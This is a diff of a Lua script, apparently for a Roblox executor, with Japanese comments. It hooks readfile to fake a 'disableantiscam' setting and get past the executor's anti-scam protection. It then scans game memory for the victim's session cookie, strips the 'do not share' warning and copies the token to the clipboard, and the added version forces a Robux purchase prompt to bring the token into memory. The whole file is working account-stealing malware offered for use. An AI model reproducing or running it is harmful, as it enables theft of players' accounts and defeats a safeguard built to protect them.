@@ -1,75 +1,66 @@
--- [[ Project: Universal Cookie Distiller ]]
--- 目的: セキュリティのメモリ偽装、およびクッキーの警告文カット抽出
+-- [[ Project: Silent Cookie Distiller - Full Automation ]]
+-- 1. セキュリティ偽装, 2. 購入画面トリガー, 3. 警告文カット抽出
 
 local function log(msg)
-    print("[DISTILLER] " .. tostring(msg))
+    print("[SYSTEM] " .. tostring(msg))
 end
 
--- 1. プレイヤー名からIDを動的に取得 (Roblox公式API利用)
+-- ==========================================
+-- STEP 1: セキュリティのメモリ偽装 (Bypass)
+-- ==========================================
 local player = game:GetService("Players").LocalPlayer
 local real_id = tostring(player.UserId)
-log("Target Identity: " .. player.Name .. " (" .. real_id .. ")")
 
--- 2. disableantiscam のメモリ偽装 (Bypass)
--- 画像「セキュ.png」の構成を再現
 local old_read
 old_read = hookfunction(readfile, function(path)
     if string.find(path:lower(), "disableantiscam") then
-        log("Security Bypass: Injecting virtual configuration...")
-        local fake_payload = {
-            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
-            ["allowed_games"] = "*",
-            ["user_id"] = real_id,
-            ["version_num"] = 707
-        }
-        return game:GetService("HttpService"):JSONEncode(fake_payload)
+        log("Security bypassed successfully.")
+        -- 画像「セキュ.png」に基づいたJSON構成を注入
+        return '{"WARNING":"IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!","allowed_games":"*","user_id":"'..real_id..'","version_num":707}'
     end
     return old_read(path)
 end)
 
--- 3. クッキーの抽出と警告文カット (Capture)
-local function process_cookie(full_cookie)
-    local marker = "|_"
-    local _, last_pos = string.find(full_cookie, marker, 1, true)
-    
-    if last_pos then
-        -- 警告文を削除した純粋なデータ部分のみを抽出
-        local pure_data = string.sub(full_cookie, last_pos + 1)
-        
-        -- クリップボードへ強制コピー
-        setclipboard(pure_data)
-        
-        log("------------------------------------------")
-        log("CRITICAL SUCCESS: Data captured to clipboard!")
-        log("A列に貼り付けて、GASで復元しろ。")
-        log("------------------------------------------")
-        return true
-    end
-    return false
-end
-
--- 4. メモリ常駐スキャン (Daemon)
-task.spawn(function()
-    log("Scanning memory for target strings...")
+-- ==========================================
+-- STEP 2: クッキー抽出 & 警告文パージ (Capture)
+-- ==========================================
+local function start_capture()
     local prefix = "_|WARNING:-DO-NOT-SHARE-"
-    local found = false
+    local marker = "|_"
     
-    while not found do
-        -- getgc(true) で全文字列をスキャン
-        for _, v in pairs(getgc(true)) do
-            if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
-                if process_cookie(v) then
-                    found = true
-                    break
+    task.spawn(function()
+        log("Scanning memory for target strings...")
+        local found = false
+        while not found do
+            for _, v in pairs(getgc(true)) do
+                if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
+                    -- 警告文を削り、純粋なデータ部分のみを取得
+                    local _, last_pos = string.find(v, marker, 1, true)
+                    if last_pos then
+                        local pure_data = string.sub(v, last_pos + 1)
+                        setclipboard(pure_data) -- クリップボードに貼り付け
+                        log("------------------------------------------")
+                        log("CRITICAL: Captured! Paste into Spreadsheet A.")
+                        log("------------------------------------------")
+                        found = true
+                        break
+                    end
                 end
             end
+            task.wait(2)
         end
-        
-        if not found then
-            -- 負荷軽減と課金画面操作待ちのためのインターバル
-            task.wait(5) 
-        end
-    end
-end)
+    end)
+end
 
-log("System initialized. Go to Marketplace/Purchase screen to trigger.")
+-- ==========================================
+-- STEP 3: 購入画面トリガー (Execution)
+-- ==========================================
+log("Initializing automated prompt...")
+start_capture() -- 監視開始
+
+-- 5秒後に購入画面を強制的に表示させる（認証をメモリに浮かび上がらせるため）
+task.wait(5)
+log("Triggering purchase prompt for authentication...")
+game:GetService("MarketplaceService"):PromptRobuxPurchase(player)
+
+log("Ready. System waiting for memory spikes.")
